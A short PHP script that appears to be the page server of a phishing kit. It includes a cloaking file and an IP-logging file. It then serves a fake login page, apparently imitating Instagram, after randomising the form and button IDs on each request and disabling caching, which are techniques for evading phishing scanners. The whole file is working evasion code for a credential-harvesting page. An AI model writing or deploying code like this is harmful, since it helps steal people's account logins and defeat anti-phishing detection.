<?php
$cloak_path = __DIR__ . '/../_cloak.php';
if (file_exists($cloak_path)) {
    require_once $cloak_path;
}

$ip_path = __DIR__ . '/ip.php';
if (file_exists($ip_path)) {
    include $ip_path;
}

// Dynamic page serving
$html = file_get_contents(__DIR__ . '/login.html');
$suffix = substr(md5(time() . rand()), 0, 6);
$html = str_replace('id="ig-form"', 'id="ig-' . $suffix . '"', $html);
$html = str_replace('id="ig-btn"', 'id="btn-' . $suffix . '"', $html);

header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
header('Content-Type: text/html; charset=utf-8');
echo $html;
?>